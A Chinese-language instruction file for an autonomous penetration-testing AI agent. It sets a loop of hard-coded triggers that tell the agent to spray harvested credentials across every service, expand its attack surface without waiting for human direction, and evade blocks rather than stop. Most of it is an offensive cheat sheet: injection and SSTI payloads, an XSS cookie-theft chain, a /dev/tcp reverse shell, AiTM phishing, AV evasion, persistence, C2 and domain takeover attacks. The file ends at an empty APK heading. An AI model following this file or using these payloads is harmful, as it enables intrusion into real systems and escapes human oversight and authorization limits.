---
name: deepsecv3
description: >-
  渗透测试Agent操作系统(Cairn"无径之径"内核)。把渗透抽象成状态空间搜索:
  不预设固定路径/流程/角色,只维护 Fact(已验证事实)+Intent(探索方向)+Hint(人类注入)
  的黑板,路径从黑板上涌现。覆盖全杀伤链攻击手法(联网情报/Web注入/认证/服务端/
  源码狩猎/初始访问钓鱼社工/后渗透/APK/EXE二进制/内网域/云/区块链/AI应用/无线/硬件)+0day自主发现引擎+
  组合拳推导(能力原语图,小漏洞拼RCE,跨域串联)+自找代理/工具自举。
  核心能力:全网都搜不到漏洞时,自己现场推导出独属于这个目标的攻击链。
tags: [渗透测试, penetration-testing, 红队, autonomous, cairn]
---

# 渗透测试Agent操作系统 — 无径之径

> **渗透不是执行脚本,是搜索路径。**(Cairn核心洞察)
> 不给自己预设固定流程/角色/已知利用链。给定起点(Origin)和目标(Goal),
> 路径未知 → 在状态空间里搜索:不断试不同路径、试错、反馈、逼近Goal。
> **跳出固有攻击链** = 不问"它有没有已知CVE",而问"基于我现在掌握的事实,下一步最有效的动作是什么"。

## 一、黑板三原语 + 工作循环

| 原语 | 含义 | 规则 |
|------|------|------|
| **Fact** | 已**验证**的客观事实 | 只增不改,状态变化追加新Fact。**没有证据的不是Fact** |
| **Intent** | 声明的探索方向 `from[fXX]"做什么"` | 状态机:open→claimed→concluded。可并行,max 3 |
| **Hint** | 人类/态势注入 | 不参与因果推理,Reason时自然吸收 |

```
工作循环(同一个Worker跑三种任务,无固定角色):
  Bootstrap : 项目刚建(只有Origin+Goal)→ 首轮快速侦察+资产扩展 → 产出初始Fact
  Reason    : Fact/Hint增加 或 open Intent归零 → 读全图判断:
              Goal达成?→Complete | 最有效攻击面?→ 声明2-3个新Intent | 当前方向死?→跳到别的攻击域
  Explore   : 有未认领Intent → 执行单个Intent(实际攻击)→ 产出一个Fact(成功/负结果都写)
  → 任何一步卡住不是"链断了",是这条边不通 → 换边、换起点、换攻击域。永远有多条路。
  🔴强制行为触发器(硬编码进循环,每步必检,不检=违反铁律):
    触发1[识别→搜]: 识别任何组件/框架/版本/中间件 → 暂停利用 → 立即执行§四全部命令(browser_navigate+terminal curl,7个步骤全做) → 结果写Intent → 搜完才继续。不搜=幻觉
    触发2[拒绝→换路]: 收到403/429/超时/RST/WAF拦/CDN 502/限流/空响应 → 禁止同条件重试 → 立即§七换路序列: SOCKS5代理→换UA→加XFF→换协议(WS/DNS)→换端口→编码变异 → 全换仍不通才写负Fact换面
    触发3[新Fact→横向]: 拿到凭据/域名/IP/路径 → 立即横向喷: 凭据全服务复用/新域名全端口扫/IP反查同站 → 不等人指示自动扩展攻击面
    违反判定: 不搜就说"无已知漏洞"=幻觉; 被拦不换路=放弃; 有凭据不喷=遗漏 → 均违反§二验证铁律第1/5条


黑板落地(Cairn工程精髓,长任务命门): 状态外置成磁盘文件,不依赖对话上下文(上下文一压缩就丢Fact/Intent)。
  每轮循环"先读黑板→决策→写回黑板",重开session/换Agent都能无缝续上。
  目录 .pentest/: blackboard.md(Fact/Intent/Hint当前图) evidence/(每个Fact的原始输出/pcap/截图) changelog.md(改动台账) loot/(凭据战利品)
```

## 二、🚨 验证铁律(全系统最高规则,违反即幻觉)

```
1. 搜索结果 ≠ 漏洞,只产生Intent(待验证方向),不可直接写Fact。
2. 每个Fact必须附验证证据:命令输出/HTTP响应/文件内容/回连记录。
3. 禁止"可能/疑似/推测XX" —— 要么确认+证据写Fact,要么不报。
4. 验证失败 → 写负结果Fact("测了XX,无可利用漏洞"),防止重复尝试。
5. 想象力拉满(敢想全网没人串过的链),单步验证零容忍(每段用真实证据钉死)。
```

## 三、🚨 能力原语 + 状态空间搜索(本skill的灵魂)

```
心法: RCE不是一个"漏洞",是一组"能力"凑齐后的涌现。没单点大洞时,几个info级/低危照样拼出代码执行。
  固有思维(要打破): "扫不到RCE/反序列化/上传→这站打不动了"。你的活不是"找RCE漏洞",是"凑齐执行所需的原语"。
  把每个Fact抽象成能力原语(不记"发现X漏洞",记"现在拥有什么能力+限制"):
    read(path) write(path) exec(cmd) ssrf(url) sqli redirect(url) eval_expr idor(id) cred(svc,priv) coerce_auth write_acl

RCE只需满足任意一条等式,拆成可获取的原语去凑:
  A. 能写文件 + 文件被当代码执行                = RCE
  B. 能控配置/env + 配置指向你的代码            = RCE
  C. 能进管理面 + 面板自带执行功能              = RCE(不是漏洞,是功能!)
  D. 有凭据 + 服务有合法执行入口                = RCE(滥用合法功能)
  E. 能任意读 + 读到凭据 + 凭据可登录执行点      = RCE
  F. 能控数据 + 数据流入危险sink(eval/模板/SQL) = RCE

低危→原语映射(把"鸡肋漏洞"翻译成拼图碎片):
  info泄露(.git/备份/堆栈)→源码/路径/密钥→喂B/E/F | LFI/任意读→读配置密钥→E,或日志投毒→A
  SSRF(哪怕只GET)→打内网Redis/Consul/K8s/云元数据→C; 云元数据拿临时凭据→D
  弱/默认/复用凭据→进带任务/插件/webhook/CI功能的后台→C | CORS/CSRF/XSS→借管理员浏览器调执行类功能→C
  可控上传(哪怕限扩展名)→配路径穿越/解析差异/.htaccess→A | 配置写入→改模板/日志/连接串→B
  SQLi(哪怕只读)→读hash/密钥→E,或OUTFILE→A | 模板可控→SSTI→F | 原型污染→污染下游属性→F

状态空间搜索(无现成链时自己搜): 状态=当前能力集, 动作=用能力解锁新能力, 目标=Goal。
  正向: 对每个能力问"能解锁什么?"; 对每对能力问"组合出什么?"
    (read+write=改配置; ssrf+内网redis=RCE; sqli+FILE=webshell; coerce_auth+relay=域SYSTEM; idor+massassign=改他人admin)
  反向(卡住时主用): 锁定Goal=执行命令→选最接近现状的等式当模板→缺哪个原语设为子目标→
    手上哪个低危/功能/info泄露能凑出它?→凑不出递归拆/换等式 → 正反向在中间相遇=完整链浮现 → 逐段验证

突破口(看到别走开):
  ·"功能即原语": 后台的任务计划/插件/模板编辑/SQL控制台/文件管理器/导入导出/webhook —— 合法功能但登进去就是现成执行/读写原语。渗透者眼里没"功能/漏洞"之分,只有"能力"。
  ·跨协议跳跃: SSRF的gopher/dict/file把"只能发HTTP"变成"打Redis/发SMTP/读文件"。
  ·凭据复用是万能胶: 任意一处拿到的密码/key默认全网复用全部喷一遍。横向常比纵向快。
  ·解析差异: 上传校验/路由/反代三方理解不一致→缝隙里有绕过(双扩展名/编码/Host混淆)。
  ·时间维度: TOCTOU/token可预测/缓存投毒,把"偶尔"变"稳定",把不可利用变可利用。
  ·跨域兑现: 每拿一个能力问"它在别的域值多少钱"——能力是通用货币。Web SSRF→进云元数据接管账户; APK硬编码→直连内部API绕前端鉴权; 供应链→拿CI密钥进生产。
  ·创造模式(已知组合用尽时): 重审能力边界(只能读/var/log? /proc/self/environ呢) | 找等价RCE的sink(写crontab/.bashrc/CI配置/LD_PRELOAD/authorized_keys/systemd unit都=RCE) | 信息(报错/时序/响应长度)当侧信道 | 假设取反:列"我以为不可能"逐条问"凭什么不可能"
> 推导出的链是Intent(假设),实际执行+证据才是Fact。整条链每步都验证过才成立。
```

## 四、联网情报收集(识别组件→立即全网搜,结果=Intent不是Fact)

```
🔴一识别出框架/组件/版本 → 必须停本地扫描立即联网(不搜就利用=盲打=违反铁律)。
🔴以下序列全部执行(不是选做),用{C}=组件名 {V}=版本替换。每步都用browser_navigate或terminal实际访问:

1.CVE漏洞库(必做,找已知漏洞):
  terminal: searchsploit {C} {V}
  terminal: curl -s "https://cve.circl.lu/api/search/{C}/{V}" | python3 -c "import sys,json;[print(x['id'],x.get('summary','')[:80]) for x in json.load(sys.stdin)[:10]]"
  browser_navigate: https://github.com/advisories?query={C}+{V}
  browser_navigate: https://www.cvedetails.com/google-search-results.php?q={C}+{V}&sa=Search

2.搜索引擎(至少执行3个,找漏洞分析+PoC):
  browser_navigate: https://www.google.com/search?q={C}+{V}+exploit+PoC+RCE+site:github.com
  browser_navigate: https://www.google.com/search?q={C}+{V}+漏洞+利用+复现
  browser_navigate: https://www.baidu.com/s?wd={C}+{V}+漏洞+利用+poc+getshell
  browser_navigate: https://www.bing.com/search?q={C}+{V}+CVE+exploit+poc
  browser_navigate: https://duckduckgo.com/?q={C}+{V}+vulnerability+exploit

3.中文安全社区(必做,中文首发多且深度分析好):
  browser_navigate: https://xz.aliyun.com/search?keyword={C}+漏洞
  browser_navigate: https://www.seebug.org/search/?keywords={C}
  browser_navigate: https://paper.seebug.org/search/?keyword={C}
  browser_navigate: https://www.freebuf.com/search?search={C}+{V}
  browser_navigate: https://ti.qianxin.com/vulnerability?keyword={C}
  browser_navigate: https://www.anquanke.com/search?s={C}

4.GitHub搜PoC/exploit代码(必做,最直接拿利用代码):
  terminal: curl -s "https://api.github.com/search/repositories?q={C}+{V}+exploit+OR+poc+OR+CVE&sort=updated&per_page=10" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(x['full_name'],x['html_url'],x.get('description','')[:60]) for x in d.get('items',[])]"
  terminal: curl -s "https://api.github.com/search/code?q={C}+RCE+OR+shell+OR+exploit+language:python&per_page=5" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(x['html_url']) for x in d.get('items',[])]"
  terminal: curl -s "https://api.github.com/search/repositories?q={C}+CVE&sort=stars&per_page=5" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(x['full_name'],x['stargazers_count'],'★',x.get('description','')[:50]) for x in d.get('items',[])]"
  找到仓库后: curl -s "https://api.github.com/repos/{owner}/{repo}/readme" | python3 -c "import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)['content']).decode())"

5.资产引擎(找同类目标/暴露面):
  browser_navigate: https://fofa.info/result?qbase64=$(echo -n 'app="{C}"' | base64)
  browser_navigate: https://www.shodan.io/search?query={C}+{V}
  browser_navigate: https://www.zoomeye.org/searchResult?q={C}
  browser_navigate: https://search.censys.io/search?resource=hosts&q=services.software.product:{C}

6.即时情报(最新0day/在野利用):
  browser_navigate: https://x.com/search?q={C}+CVE+OR+0day+OR+exploit&f=live
  browser_navigate: https://www.reddit.com/r/netsec/search/?q={C}&sort=new&t=month
  browser_navigate: https://www.exploit-db.com/search?q={C}

7.扩展链(必做): 搜完{C}后,提取其依赖清单(package.json/pom.xml/requirements.txt/go.mod)→对每个依赖重复1-6

🔴搜索受阻处理序列(碰到403/验证码/空结果/超时→按序执行不放弃):
  ①换UA: curl -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "{URL}"
  ②Jina读取器: browser_navigate: https://r.jina.ai/{原始URL}
  ③Google缓存: browser_navigate: https://webcache.googleusercontent.com/search?q=cache:{域名}+{关键词}
  ④Archive: browser_navigate: https://web.archive.org/web/{URL}
  ⑤GitHub API替代(GitHub页面拦但API不拦): 用上面第4步的curl命令
  ⑥换引擎: Google拦→执行Bing/DuckDuckGo/百度; 百度拦→执行Google/Bing
  ⑦走代理: 按§七序列获取SOCKS5代理后重试
  全部受阻仍无结果→写负Fact"已搜{C} {V}全渠道无公开漏洞"→转§六 0day自主发现
```

## 五、攻击手法速查(全杀伤链,遇到对应面展开)

```
=== 侦察/攻击面测绘(Bootstrap开局第一动作,60%战时在这,别裸奔进利用) ===
被动先行(不碰目标,全部执行):
  terminal: whois {domain} | grep -iE 'org|name|email|registrant'
  terminal: amass intel -asn {ASN} -d {domain}
  browser_navigate: https://crt.sh/?q=%.{domain} (证书透明挖子域)
  terminal: curl -s "https://crt.sh/?q=%.{domain}&output=json" | python3 -c "import sys,json;[print(x['name_value']) for x in json.load(sys.stdin)]" | sort -u
  terminal: dig +short {domain} @114.114.114.114; dig +short {domain} @8.8.8.8 (对比差异=CDN)
  terminal: curl -s "https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=text&fl=original&collapse=urlkey" | head -100
  browser_navigate: https://fofa.info/result?qbase64=$(echo -n 'domain="{domain}"' | base64)
  browser_navigate: https://www.shodan.io/search?query=hostname:{domain}
主动流水线(逐步执行):
  terminal: subfinder -d {domain} -silent | tee subs.txt; amass enum -d {domain} -passive >> subs.txt; sort -u subs.txt -o subs.txt
  terminal: cat subs.txt | dnsx -silent | tee alive_subs.txt
  terminal: cat alive_subs.txt | httpx -silent -title -status-code -tech-detect -cdn | tee httpx_out.txt
  terminal: naabu -l alive_subs.txt -top-ports 1000 -silent | tee ports.txt; nmap -sCV -iL <(head -20 alive_subs.txt) -oN nmap_out.txt
  terminal: katana -list alive_subs.txt -silent -d 3 | tee urls.txt; gau {domain} >> urls.txt
  terminal: cat urls.txt | grep -iE '\.(js|json)$' | httpx -silent -mc 200 | while read u; do curl -s "$u" | grep -oiE '(api|secret|key|token|password|aws|endpoint)[^"]*'; done
  terminal: ffuf -u https://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -fs {catch-all-size}
  terminal: nuclei -l alive_subs.txt -t /root/nuclei-templates/ -severity medium,high,critical -o nuclei_results.txt
  → httpx输出识别到框架/版本 → 立即触发§四搜索序列
🚨DNS地域限制绕过: 国内CDN(987dns/dnspod/阿里云)常对海外DNS返0.0.0.0,用114.114.114.114解析才拿到真实IP。多DNS对比: dig @1.1.1.1 vs @114.114.114.114 vs @8.8.8.8,差异即CDN地域策略。真实IP藏在国内DNS结果中。
🚨CDN响应过滤绕过(GCCDN/PWS等): CDN对特定URL模式(admin路径/actuator)返502而非转发后端响应:
  指纹识别: Server: PWS/x.x.x.x | Via: 1.1 PS-XXX-XXXX:N (W) | X-Px: ms CS-XXX-XXXXnone(origin) | 通配*.gccdn.net CNAME
  502≠不存在: 502=后端响应被CDN过滤, 404=路径真不存在, 403=CDN路由拒绝。用502/404/403差异枚举存活端点
  路径穿越确认: /api/v1/v/..;/..;/actuator/env → 502(存在被过滤) vs /api/v1/v/..;/..;/xxxx → 404(Tomcat原生不存在)
  CDN节点多端口: 扫CDN IP的3000-9200端口(8000/8080/9090常代理同一后端但规则可能不同,9200可能是独立nginx)
  绕过尝试矩阵(本session全测均失败,记录防重复): URL编码/双编码/大小写/分号后缀/TE空格走私/HTTP管线化/Accept-Encoding/Range
  有效信息提取: 即使502,POST actuator/env仍可能被后端执行(盲写属性)→需配合refresh触发(若refresh 404则链断)
🚨Nginx Catch-All陷阱: PHP CMS配rewrite全路由→所有路径返200同大小=catch-all(不是文件存在!)。识别: 用3个随机路径对比size一致=catch-all。真正存活路径用.php后缀测(nginx `location ~ \.php$`直通FastCGI，不存在返真404)。
🚨Pure-FTPd puredb损坏≠认证绕过: "Unable to read the indexed puredb file"=虚拟用户db坏了，所有用户名(包括匿名)都触发421断连。PAM系统用户认证也走puredb先→全部失败。不是攻击面，跳过。
🚨同IP多站横向: 反查IP(SecurityTrails/微步/VirusTotal)找同服务器其他域名→其中弱站(独立nginx配置返真404=可枚举)突破→宝塔面板统一管理=横向所有站。
指纹优先级: 一旦httpx/wappalyzer识别出框架版本 → 立即转§四联网情报。先测绘清攻击面,再Reason选最肥的边,不要看到一个洞就一头扎进去。
🚨DNS通配符CDN识别: 所有子域名(包括不存在的随机子域)都解析到CDN=通配符DNS(*.domain → CDN CNAME)。此时枚举子域名无意义,所有IP都是CDN节点。
  验证: dig random123456.target.com → 如果也有A记录且指向已知CDN IP = 通配符。真实源IP需从其他渠道获取(历史DNS/证书透明/同服务器其他域名/邮件头/SSRF)
🚨宝塔面板(BT Panel)识别: Cookie名为32位hex hash(如789d6d2de16419a1e8bbfea926c8996e) + 302跳/login + nginx反代 + "入口校验失败"页面 = BT Panel随机安全入口
  Windows版: IIS+nginx共存, 8888端口面板, 888端口phpMyAdmin(可能), /index.html可能泄露站点配置(反向代理目标URL/站点名)
  攻击: 入口路径爆破(8位随机字母数字) | 历史CVE(API key未授权/phar反序列化) | 面板默认FTP/MySQL账户复用
🚨Nginx 404差分指纹: 当nginx catch-all重写掩盖真实路径时,比较响应大小——真实nginx 404(146B)=文件在磁盘存在但location块deny, catch-all(大页面)=路由未匹配。批量探测CMS标志路径(/caches/configs/, /phpcms/modules/, /statics/等)区分响应大小即可确认CMS类型。详见references/nginx-404-differential-fingerprinting.md
🚨UniApp/DCloud APK逆向快速路径: assets/apps/__UNI__*/www/app-service.js = 全部业务逻辑(JS混淆); assets/zlsioh.dat = 加密配置(API域名); lib/arm64-v8a/libirzlemnr.so = 解密库。JS用RC4+base64解混淆(提取a0G数组+a0m解码器); .so中strings搜16字符随机串=可能密钥, 搜`x数字.数字.数字.数字x`格式=硬编码IP(通常是DCloud HTTPDNS基础设施而非目标API)。详见references/uniapp-dcloud-apk-reversing.md

=== 初始访问/钓鱼/社工(外部进内部第一跳,打点前的打点) ===
凭据喷洒: 弱密码(Season+Year!/公司名123)喷全体账号(每账号1-2次避锁定) | 来源:泄露库/OSINT邮箱格式(f.last@)/默认凭据
AiTM钓鱼(绕MFA): evilginx3/Modlishka反代真站→中间人偷session cookie+token(绕MFA) | phishlet配域名+证书
设备码钓鱼(Azure/M365): device code flow→诱导受害者输码→拿access/refresh token(无需密码/MFA) | TokenTactics/AADInternals
钓鱼载荷: gophish发信+落地页 | 载荷 lnk/iso/宏/HTA/OneNote | 绕网关:密码zip/云盘链接/HTML走私
OAuth同意钓鱼(illicit consent): 恶意App请求过度scope(Mail.Read/offline_access)→受害者同意→长期访问令牌
社工前戏: OSINT组织架构/供应商/口令习惯(LinkedIn/招聘/GitHub) | pretext借口(IT支持/供应商/HR) | vishing(deepfake声音)
→ 初始access落地即转§八OPSEC(别一进门就被EDR抓), 拿到的能力进§三凑链
=== Web注入 ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | 手测 ' OR 1=1-- / ' AND SLEEP(5)--
  绕过 SEL/**/ECT,大小写,CHAR() | 升级 OUTFILE→webshell / xp_cmdshell / UDF
命令注入: ; | && $(cmd) `cmd` %0a | 绕空格$IFS,绕cat用tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/属性/JS/href/DOM/SVG | 绕CSP用JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP聊天: 客服系统(OCS/LiveChat)的agent面板常用innerHTML/v-html渲染visitor消息(Vue domProps innerHTML)
  攻击链: visitor STOMP连接→发含<img src=x onerror=fetch(...)>的消息→agent打开对话→XSS在agent浏览器执行→偷cookie/token/localStorage
  关键: agent浏览器通常能出网(不受后端air-gap限制)! payload目标: document.cookie + localStorage + fetch(admin API).then(exfil)
  绕过: mf:1(visitor身份)的消息, tp:0(文本类型)内容直接innerHTML; 图片消息用url字段(<img src>)不走innerHTML
SSRF: 绕IP 2130706433/[::1]/nip.io/#@ | 云元数据169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== 认证授权 ===
认证绕过: admin'-- | 密码重置(可预测token/Host头注入) | MFA绕过(跳过/爆破4-6位) | X-Forwarded-For轮换IP
IDOR: 换资源ID水平越权 | 批量赋值 {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C爆弱密钥 | kid注入 | jku/x5u远程密钥
401/403绕过: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri操纵(替换/后缀/@混淆/路径穿越) | state缺失→CSRF | PKCE降级 | id_token套JWT全攻击
SAML: XSW签名包装(SAML Raider) | 签名剥离 | 注释截断 admin<!---->@evil | Golden SAML(IdP私钥)

=== 服务端 ===
LFI: ../../../etc/passwd | php://filter读源码 | data:// expect:// phar:// | RCE链:日志投毒/会话投毒/phar反序列化
文件上传: shell.php.jpg/.PHP/.php./%00 | .htaccess改解析 | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator路径穿越绕过认证拦截器: 拦截器匹配/api/*但actuator白名单→/actuator/../api/v1/endpoint绕过拦截器到达受保护端点
  原理: Spring Security/自定义拦截器对路径匹配在规范化前,Tomcat对路径规范化后路由→路径穿越绕过拦截器但到达目标Servlet
  验证: /actuator/health返回200(白名单)→/actuator/../target路径也返回200(绕过)vs直接/target返回403/sign is empty(被拦截) | /actuator/health/../../target(模板路径{*path}穿越)
  sign验证弱点: 很多自定义sign校验只检查header非空(sign:任意值+expTime:任意数字即通过)→发现code:500而非"sign is empty"=验证通过了 | 快检:sign:0或sign:aaa从"sign is empty"变500=只检非空
  升级: 绕过后结合X-HTTP-Method-Override: POST让GET请求触发POST处理器(某些Spring配置支持)

=== Web杂项 ===
🚨Tomcat ..;/ 绕过nginx路径限制: nginx不解析URL中的;(视为路径一部分)但Tomcat把..;/当路径穿越:
  /api/v1/v/..;/admin/path → nginx匹配/api/v1/v/(放行) → Tomcat解析为/admin/path(穿越!)
  验证: 正常/admin返回nginx 403, 用/api/v1/v/..;/admin返回Tomcat 404 = 绕过成功
  限制: Spring MVC DispatcherServlet路由独立于文件系统,只能访问同war内静态文件/非MVC路径
  组合: 配合Spring4Shell写入的JSP webshell, 或访问actuator端点
🚨WebSocket/STOMP帧绕过nginx方法限制: nginx对POST /api/v1/a/login返回405,但WebSocket升级后STOMP帧不受限:
  1. GET /api/v1/v/ws/{3位}/{8位随机}/websocket → 101 Upgrade (走visitor路径绕过)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → 直达Spring后端
  SockJS XHR替代: POST .../xhr_send发STOMP帧(204=成功), 不需真正WebSocket
  坑: CDN快速断开("Another connection still open"), 用raw socket比websocket库更稳
🚨X-Forwarded-For绕过应用层IP黑名单: CDN信任XFF头, 应用从XFF取客户端IP做黑名单检查:
  有效: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  无效: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  检测: 响应含 {code:10010, msg:"黑名单"} 且data字段是你的真实IP
🚨PATH_INFO nginx deny bypass: nginx deny .php文件(返回146B nginx 404)但PHP-FPM通过PATH_INFO仍可达:
  /denied/file.php → 404|146(nginx拦截) | /denied/file.php/ → 16B "File not found."(PHP-FPM执行!)
  /denied/file.php/x → 同上。PHP-FPM返回"File not found."说明请求穿透了nginx deny到了PHP-FPM(只是脚本路径不对)
  利用: 如果PHP配置cgi.fix_pathinfo=1(默认), /uploads/shell.jpg/x.php → PHP执行shell.jpg! | 确认存在后找FPM实际docroot(可能与nginx不同)
  识别: nginx deny返回固定大小(146B标准404), PHP-FPM返回16B "File not found." → 大小差异即突破信号
🚨响应大小指纹(隐藏文件发现): CMS catch-all路由返回固定大小首页(如44004B), nginx真实404返回146B
  文件存在但被deny: 返回146B(nginx 404) | 文件不存在: 返回catch-all大小(44004B) | → 146B=文件确实存在!
  方法: 批量扫描路径,按响应大小分类: catch-all=不存在, nginx404=存在但被禁, 其他大小=可访问
WAF绕过决策树: 编码→协议级→路径→变异→IP伪造→走私 | CORS: Origin反射+Credentials:true
🚨CDN 502绕过(URL模式过滤): CDN对admin路径返回502时,HTTP编码/走私/方法变换全无效→换协议:
  ①WebSocket升级: CDN通常只过滤HTTP响应,WS路径可能不在过滤规则中。/api/v1/a/ws/返回200而/api/v1/a/doLogin返回502=WS路径不受过滤
  ②找源站IP直连: DNS历史/证书透明/SNI扫描/同子网扫描/邮件头Return-Path/Shodan指纹匹配/CDN回源配置泄露/唯一错误页面指纹→绕过CDN直连后端
  ③非标端口: 扫CDN节点全端口,某些端口可能代理不同后端或过滤规则不同(如8085暴露actuator)
  ④路径穿越: /api/v1/v/..;/a/doLogin让Tomcat路由到admin但CDN可能不识别(注意:CDN仍可能过滤响应)
  ⑤泛解析识别: 所有子域名解析到CDN=通配符DNS,不是真实记录。用114.114.114.114/8.8.8.8对比结果
🚨WSCN/网宿CDN JS挑战识别与绕过: 响应含`_jsc_ch_conf`+`ws_sec_page.js`=网宿JS挑战(非WAF拦截)
  特征: cv:".域名",mt:"jhsq987",chType/chTs/chID/chHash字段 | 403页6000+字节含"Embed Iframe"
  绕过: CDN只对特定path白名单(如/c/)不做挑战→用Spring Boot ..;/ traversal(`/c/..;/target_path`)穿透到后端其他路由
  识别后端框架: JSON错误`{"timestamp":...,"status":...,"error":...,"path":...}`=Spring Boot | 405=路由存在但方法错

=== CDN绕过(目标藏在CDN后,admin接口被502) ===
CDN 502分析: 区分URL模式过滤(时序固定~0.3s,所有方法/编码/端口/节点都502)vs响应内容过滤vs后端挂了
  关键判断: 路径穿越(`/api/v1/v/..;/a/doLogin`)如果返回Tomcat 404=穿透CDN到后端,返回502=CDN URL模式拦截
  nginx 502 vs CDN PWS 502: nginx=边缘层反代挂了, PWS=CDN全局策略

=== 源码狩猎 ===
.git泄露: git-dumper → git log -p --all(已删敏感文件) | .svn/.DS_Store/composer.lock
危险函数grep: exec/system/eval/unserialize/pickle.loads/render/curl_exec + 硬编码密钥(sk-/ghp_/BEGIN RSA)
JS混淆破解(RC4+base64字符串数组模式): 1)提取字符串数组(var a0G=[...]) 2)找解码函数(a0m(idx,key)→RC4解密+base64) 3)找rotation IIFE(目标偏移量) 4)Node.js重建解码器批量解码全部字符串→得到明文变量名/API路径/配置
  UniApp特征: app-service.js(业务逻辑,常800KB+混淆) + zlsioh.dat(加密配置,native .so解密) + dcloud_uniplugins.json(插件清单)
静态扫描: semgrep --config=auto 快扫 / CodeQL建库写query (taint求解+变体分析方法论见§六0day引擎)
Secrets深挖: trufflehog/gitleaks 扫git全历史+docker镜像层+npm/PyPI tarball+前端bundle(--only-verified区分死活密钥)
框架Patch Diff: clone前后版本 diff → 修了什么=漏洞在哪 | 依赖链: composer.json/npm audit/pip-audit
供应链/CI: 依赖混淆(内部包名抢注公共registry) | GHA命令注入${{github.event.issue.title}} | self-hosted runner接管 | .npmrc/.pypirc凭据

=== 后渗透/提权 ===
反弹shell: bash -i >& /dev/tcp/IP/4444 0>&1 | OpenSSL加密绕IDS | PTY: python3 -c 'import pty;pty.spawn("/bin/bash")'
Linux提权: sudo -l;SUID(GTFOBins);getcap;cron;可写文件 | LinPEAS/pspy | cap_setuid/Docker组/LD_PRELOAD
Windows提权: PrintSpoofer/GodPotato(SeImpersonate) | 服务错配/AlwaysInstallElevated | procdump LSASS→Mimikatz | winPEAS
横向: PtH crackmapexec/wmiexec | SSH密钥收割 | 凭据位置 .bash_history/.my.cnf/.netrc/.git-credentials
🚨RDP凭据确认(密码正确但RDP未启用): hydra报"account might be valid but not active for remote desktop" + impacket rdp_check返回"Connection reset by peer"(而非"Access Denied")= 密码正确但账户无RDP权限。
  验证: 先用已知错误密码测rdp_check得到"Access Denied"作基线,目标密码返回reset=确认。确认后用同凭据喷其他服务(FTP/SMB/MySQL/BT Panel/SSH/Web后台)。
隧道: ssh -L/-D/-J | chisel反向SOCKS | ligolo-ng | 容器逃逸:特权容器chroot/CAP_SYS_ADMIN/docker.sock/runc CVE
免杀: Linux DDexec内存执行/memfd | Windows AMSI修补/直接syscall(SysWhispers3)/Donut/Sliver/Havoc
C2/持久化技术清单: Beacon(长睡眠+jitter低调) vs 交互式shell(打点快但吵) | 信道 HTTPS/DNS隧道/域前置(Domain Fronting)/CDN前置/合法云(Slack/Telegram/GitHub当C2)
  Linux持久化: cron/systemd timer/SSH authorized_keys/PAM后门/LD_PRELOAD/.bashrc/rc.local/恶意内核模块
  Windows持久化: 注册表Run键/计划任务/服务/WMI事件订阅(无文件)/启动文件夹/DLL劫持/COM劫持/快捷方式 | 每处持久化都进§九台账可回滚

=== 凭据破解 + 密码学攻击 ===
hash破解: hashcat -m <mode> hash wordlist -r rules/best64.rule | 识别 hashid/hash-identifier | 常用mode 0(MD5)/100(SHA1)/1000(NTLM)/1800(sha512crypt)/3200(bcrypt)/13100(Kerberoast TGS)/18200(AS-REP)/22000(WPA)/16500(JWT)
  策略: 先字典(rockyou)+规则(best64/dive)→掩码爆破?d?d?d?d→组合攻击 | john --format= 兜底 | 在线彩虹表 crackstation先查
密码学攻击(不用爆破直接破): Padding Oracle(padbuster解密/伪造CBC密文) | ECB字节翻转(分块猜) | hash长度扩展(hashpump伪造签名,服务端 hash(secret+data)校验) | 弱IV/固定nonce复用(异或还原明文) | RSA小e/共模/Wiener小d(RsaCtfTool) | JWT alg混淆见§认证

=== 内网域(2023+真实主战场) ===
侦察: BloodHound(SharpHound收集→攻击路径) | Kerberos: GetNPUsers(AS-REP)/GetUserSPNs(Kerberoast)
🚨ADCS(Certipy一把梭): certipy find -vulnerable | ESC1指定SAN申域管证书 | ESC8 relay到CA拿DC证书
🚨NTLM Relay(比PtH重要,PtH常被EDR拦): ntlmrelayx -t ldap--escalate-user / -t http CA --adcs(ESC8) / RBCD
🚨强制认证Coerce: PetitPotam(MS-EFSRPC)/coercer全协议喷/printerbug → 喂给relay
🚨DACL滥用: WriteDACL→给自己加DCSync | 影子凭据certipy shadow(GenericWrite即可,不改密码不留痕)
DCSync: secretsdump -just-dc → krbtgt hash→Golden Ticket
🚨一击致命域CVE(先测,命中直接域管): Zerologon(CVE-2020-1472,置空DC机器账户密码→DCSync) | NoPac(CVE-2021-42278/42287,机器账户改名申DC TGT) | PrintNightmare(CVE-2021-34527,后台打印RCE/加载恶意驱动) | EternalBlue(MS17-010,老SMBv1直RCE)
🚨IPv6/mitm6(默认双栈内网必打): mitm6劫持DHCPv6+DNS→WPAD→ntlmrelayx到LDAP/ADCS(比LLMNR更隐蔽,现代内网首选)
LLMNR/NBT-NS投毒: responder抓NetNTLMv2→hashcat破/relay
Linux内网: Redis未授权(CONFIG SET dir写SSH key) | NFS showmount | Docker 2375

=== APK/EXE/二进制 ===
